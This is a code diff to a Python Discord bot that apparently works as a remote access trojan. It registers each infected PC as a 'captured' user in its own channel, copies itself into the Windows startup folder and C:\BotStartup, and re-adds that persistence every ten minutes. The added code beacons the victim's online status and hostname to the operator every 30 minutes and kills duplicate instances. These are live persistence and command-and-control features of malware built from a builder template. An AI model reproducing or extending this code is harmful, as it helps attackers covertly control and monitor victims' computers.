@@ -7,7 +7,10 @@ import sys
 import shutil
 import tkinter as tk
 import ctypes
+import atexit
+import threading
 from concurrent.futures import ThreadPoolExecutor
+
 
 # List of non-standard packages to install
 NON_STANDARD_PACKAGES = [
@@ -23,7 +26,8 @@ NON_STANDARD_PACKAGES = [
     "comtypes",
     "requests",
     "pyscreeze==0.1.28",  # Pin to stable version
-    "mss"  # Alternative screenshot library as backup
+    "mss",
+    "psutil"  # Alternative screenshot library as backup
 ]
 
 def install_packages():
@@ -72,8 +76,94 @@ def install_packages():
                         
             except subprocess.CalledProcessError as e:
                 print(f"Failed to install {package}: {e.stderr}")
+
+
+def is_already_running():
+    """Check if another instance is already running and kill duplicates"""
+    try:
+        current_process_path = os.path.abspath(sys.argv[0])
+        current_process_name = os.path.basename(current_process_path).lower()
+        
+        print(f"🔍 Singleton check - Current PID: {os.getpid()}, Process: {current_process_name}")
+        
+        # Only check for EXE files
+        if not current_process_name.endswith('.exe'):
+            print("ℹ️ Running as Python script, singleton check skipped")
+            return False
+            
+        import psutil
+            
+        current_pid = os.getpid()
+        current_create_time = psutil.Process(current_pid).create_time()
+        killed_pids = []
+        
+        # First pass: identify duplicates
+        duplicates = []
+        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'create_time']):
+            try:
+                if proc.info['pid'] == current_pid:
+                    continue
+                    
+                proc_exe = proc.info.get('exe', '').lower() 
+                proc_name = proc.info.get('name', '').lower()
+                proc_cmdline = proc.info.get('cmdline', [])
+                
+                is_same_process = (
+                    proc_exe == current_process_path.lower() or
+                    proc_name == current_process_name or
+                    (proc_exe and os.path.basename(proc_exe) == current_process_name) or
+                    (proc_cmdline and any(current_process_path.lower() in cmd.lower() for cmd in proc_cmdline if cmd))
+                )
+                
+                if is_same_process:
+                    # Check which process is older
+                    proc_create_time = proc.info.get('create_time', 0)
+                    if proc_create_time < current_create_time:
+                        # The other process is older, THIS instance should exit
+                        print(f"⚠️ Found older instance (PID {proc.info['pid']}), this instance will exit")
+                        return True
+                    else:
+                        # This process is older, kill the duplicate
+                        duplicates.append(proc)
+                    
+            except (psutil.NoSuchProcess, psutil.AccessDenied, AttributeError):
+                continue
+        
+        # If no duplicates found, continue
+        if not duplicates:
+            print("✅ No duplicate instances found")
+            return False
+            
+        print(f"🚫 Found {len(duplicates)} duplicate processes")
+        
+        # Second pass: kill duplicates with delays
+        for proc in duplicates:
+            try:
+                print(f"🔄 Killing duplicate process: PID {proc.info['pid']}")
+                proc.kill()
+                killed_pids.append(proc.info['pid'])
+                # Wait for process to fully terminate
+                time.sleep(1)
+            except Exception as kill_error:
+                print(f"❌ Failed to kill process {proc.info['pid']}: {kill_error}")
+        
+        if killed_pids:
+            print(f"🎯 Killed {len(killed_pids)} duplicate instances: PIDs {killed_pids}")
+            # Extra wait to ensure system stability
+            time.sleep(2)
+            
+        # Return False since we are the surviving instance
+        return False
+        
+    except Exception as e:
+        print(f"❌ Singleton check error: {e}")
+        # On error, assume we should continue (safer than crashing)
+        return False
+
+
 # Run package installation at startup
 install_packages()
+
 # Import non-standard modules after installation
 import discord
 from discord.ext import commands, tasks
@@ -85,6 +175,12 @@ import win32con
 import win32gui
 import pygame
 from pygame.locals import *
+
+# CRITICAL: Check for duplicate instances BEFORE starting the bot
+if is_already_running():
+    print("🛑 Exiting: Another instance is already running")
+    sys.exit(0)
+
 
 # Set up Discord bot with intents
 intents = discord.Intents.default()
@@ -99,7 +195,10 @@ user_channels = {}
 async def on_ready():
     print(f"Logged in as {bot.user.name}")
 
-    pc_username = os.getlogin()
+    # Set start time FIRST
+    bot.start_time = time.time()
+
+    pc_username = os.getlogin().lower()
 
     # Get the category using the global category_id
     category = bot.get_channel(int(category_id))
@@ -110,14 +209,21 @@ async def on_ready():
     channel = discord.utils.get(category.text_channels, name=pc_username.lower())
 
     if channel:
-        await channel.send(f"PC turned on, user {pc_username} back online!")
+        await channel.send(f"🟢 PC turned on, user **{pc_username}** back online!")
     else:
-        channel = await category.create_text_channel(pc_username.lower())  # Use lowercase for consistency
-        await channel.send(f"New user captured: {pc_username}!")
+        channel = await category.create_text_channel(pc_username.lower())
+        await channel.send(f"🟢 New user captured: **{pc_username}**!")
     
     # Store the channel for this user
     user_channels[pc_username.lower()] = channel.id
-
+    
+    # Start the status monitoring task if not already running
+    if not user_online_status.is_running():
+        user_online_status.start()
+    
+    # Start startup checking task if not already running  
+    if not check_startup.is_running():
+        check_startup.start()
 # Add this function to check if command is from the correct user's channel
 def is_correct_user_channel():
     async def predicate(ctx):
@@ -568,19 +674,25 @@ async def add_to_startup(file_path, file_name, startup_folder):
     except Exception:
         return False
 
-@tasks.loop(minutes=1.0)
+@tasks.loop(minutes=10.0)
 async def check_startup():
     """
-    Background task to check every minute if the file is in the startup folder.
-    Re-adds it if missing.
+    Background task to check if the file is in the startup folder.
+    Only re-adds if missing and only for EXE files.
     """
     try:
         file_path = os.path.abspath(sys.argv[0])
         file_name = os.path.basename(file_path)
         file_ext = os.path.splitext(file_name)[1].lower()
         
-        if file_ext not in ('.py', '.exe'):
-            return  # Silently skip invalid files
+        # Only handle .exe files in startup check to prevent loops
+        if file_ext != '.exe':
+            return
+        
+        # Verify the current file actually exists before proceeding
+        if not os.path.exists(file_path):
+            print(f"⚠️ Current executable path doesn't exist: {file_path}")
+            return
         
         # Define C:\BotStartup path
         c_drive_folder = r"C:\BotStartup"
@@ -589,33 +701,125 @@ async def check_startup():
         
         # Check if file exists in startup folder
         startup_path = os.path.join(startup_folder, file_name)
-        if not os.path.exists(startup_path):
-            # Ensure C:\BotStartup file exists
-            if os.path.exists(c_drive_path):
-                # Re-add to startup
-                if await add_to_startup(c_drive_path, file_name, startup_folder):
-                    print(f"Re-added '{file_name}' to startup folder.")
-                else:
-                    print(f"Failed to re-add '{file_name}' to startup folder.")
+        
+        # Verify C:\BotStartup file is valid before copying
+        if os.path.exists(c_drive_path) and not os.path.exists(startup_path):
+            # Additional check: ensure file sizes match to prevent corrupted copies
+            try:
+                if os.path.getsize(file_path) != os.path.getsize(c_drive_path):
+                    print(f"⚠️ File size mismatch - skipping startup copy")
+                    return
+                    
+                shutil.copy2(c_drive_path, startup_path)
+                print(f"Re-added '{file_name}' to startup folder.")
+            except Exception as e:
+                print(f"Failed to re-add to startup: {e}")
+                
     except Exception as e:
         print(f"Error in check_startup task: {e}")
+# Add this new task for user online status monitoring
+@tasks.loop(minutes=30.0)  # Every 30 minutes
+async def user_online_status():
+    """
+    Send status update every 30 minutes to show user is still online.
+    """
+    try:
+        pc_username = os.getlogin().lower()
+        
+        # Check if we have a channel for this user
+        if pc_username in user_channels:
+            channel_id = user_channels[pc_username]
+            channel = bot.get_channel(channel_id)
+            
+            if channel and hasattr(bot, 'start_time'):
+                # Send online status
+                embed = discord.Embed(
+                    title="🟢 User Online Status",
+                    description=f"User **{pc_username}** is still online and connected",
+                    color=discord.Color.green(),
+                    timestamp=discord.utils.utcnow()
+                )
+                embed.add_field(name="System Time", value=f"<t:{int(time.time())}:F>", inline=True)
+                embed.add_field(name="Uptime", value=f"<t:{int(bot.start_time)}:R>", inline=True)
+                embed.set_footer(text="UltraDonk Bot - Status Monitor")
+                
+                await channel.send(embed=embed)
+                print(f"Sent online status update for user {pc_username}")
+                
+    except Exception as e:
+        print(f"Error in user_online_status task: {e}")
 
+def shutdown_handler():
+    """
+    Handle system shutdown and send notification
+    """
+    try:
+        # This runs when the program is exiting
+        pc_username = os.getlogin().lower()
+        print(f"🔴 User {pc_username} is shutting down - Bot exiting")
+        
+        # Note: During system shutdown, we can't reliably send Discord messages
+        # as network connections are terminated quickly. This is mainly for logging.
+        
+    except Exception as e:
+        print(f"Shutdown handler error: {e}")
+
+# Register shutdown handler
+atexit.register(shutdown_handler)
+# Add command to manually check status
+@bot.command()
+@is_correct_user_channel()
+async def status(ctx):
+    """
+    Check current system status and bot uptime
+    """
+    pc_username = os.getlogin().lower()
+    uptime_seconds = int(time.time() - bot.start_time)
+    
+    # Convert uptime to readable format
+    days, remainder = divmod(uptime_seconds, 86400)
+    hours, remainder = divmod(remainder, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    
+    uptime_str = ""
+    if days > 0:
+        uptime_str += f"{days}d "
+    if hours > 0:
+        uptime_str += f"{hours}h "
+    if minutes > 0:
+        uptime_str += f"{minutes}m "
+    uptime_str += f"{seconds}s"
+    
+    embed = discord.Embed(
+        title="🔍 System Status Report",
+        color=discord.Color.blue(),
+        timestamp=discord.utils.utcnow()
+    )
+    embed.add_field(name="👤 User", value=pc_username, inline=True)
+    embed.add_field(name="🖥️ Hostname", value=os.environ.get('COMPUTERNAME', 'Unknown'), inline=True)
+    embed.add_field(name="⏰ System Time", value=f"<t:{int(time.time())}:F>", inline=True)
+    embed.add_field(name="🕐 Bot Uptime", value=uptime_str, inline=True)
+    embed.add_field(name="📊 Online Since", value=f"<t:{int(bot.start_time)}:R>", inline=True)
+    embed.add_field(name="🔧 Status", value="🟢 Online & Monitoring", inline=True)
+    embed.set_footer(text="UltraDonk Bot - Status Command")
+    
+    await ctx.send(embed=embed)
 @bot.command()
 @is_correct_user_channel()
 async def startup(ctx):
     """
-    Copies the current Python script or executable to C:\BotStartup and Windows startup.
-    Runs the bot from C:\BotStartup and checks startup folder every minute.
+    Copies the current executable to C:\BotStartup and Windows startup.
+    Only works for .exe files to prevent infinite loops.
     """
     try:
-        # Get the path to the currently running Python file or executable
+        # Get the path to the currently running file
         file_path = os.path.abspath(sys.argv[0])
         file_name = os.path.basename(file_path)
         file_ext = os.path.splitext(file_name)[1].lower()
 
-        # Validate that the file is a Python script or executable
-        if file_ext not in ('.py', '.exe'):
-            await ctx.send("❌ Error: Only Python scripts (.py) or executables (.exe) can be added to startup.")
+        # Only allow .exe files to be added to startup
+        if file_ext != '.exe':
+            await ctx.send("❌ Error: Only executable files (.exe) can be safely added to startup to prevent infinite loops.")
             return
 
         # Define C:\BotStartup folder
@@ -654,9 +858,13 @@ async def startup(ctx):
             return
 
         startup_path = os.path.join(startup_folder, file_name)
+        
+        # Check if already in startup to avoid duplicates
+        if os.path.exists(startup_path):
+            await ctx.send(f"⚠️ File already exists in startup folder. Overwriting...")
+        
         try:
-            if not os.path.exists(startup_path):
-                shutil.copy2(c_drive_path, startup_path)
+            shutil.copy2(c_drive_path, startup_path)
         except PermissionError:
             await ctx.send("❌ Error: Permission denied copying to startup folder. Run as administrator.")
             return
@@ -673,12 +881,11 @@ async def startup(ctx):
         if not check_startup.is_running():
             check_startup.start()
 
-        await ctx.send(f"✅ Success! '{file_name}' copied to C:\BotStartup and added to Windows startup. "
-                       f"Will run from C:\BotStartup and be checked every minute.")
+            await ctx.send(f"✅ Success! '{file_name}' copied to C:\BotStartup and added to Windows startup. "
+                       f"Will run from C:\BotStartup and be checked every 10 minutes.")
 
     except Exception as e:
         await ctx.send(f"❌ An unexpected error occurred: {e}")
- 
 # Commands are added by the builder above this line
 
 # Run the bot --> in the builder replace this
